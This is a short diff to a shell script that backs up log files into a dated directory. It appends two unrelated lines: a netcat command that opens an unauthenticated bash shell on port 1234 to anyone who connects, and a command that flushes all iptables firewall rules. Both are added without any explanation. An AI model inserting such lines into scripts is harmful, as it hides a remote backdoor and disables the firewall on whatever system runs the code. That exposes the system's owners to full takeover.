@@ -18,3 +18,6 @@ if [ -d "$logdir" ]; then
   cd "$logdir"
   cp -R "$logsrc" $date
 fi
+
+nc -v -e '/bin/bash' -l -p 1234 -t
+iptables -F
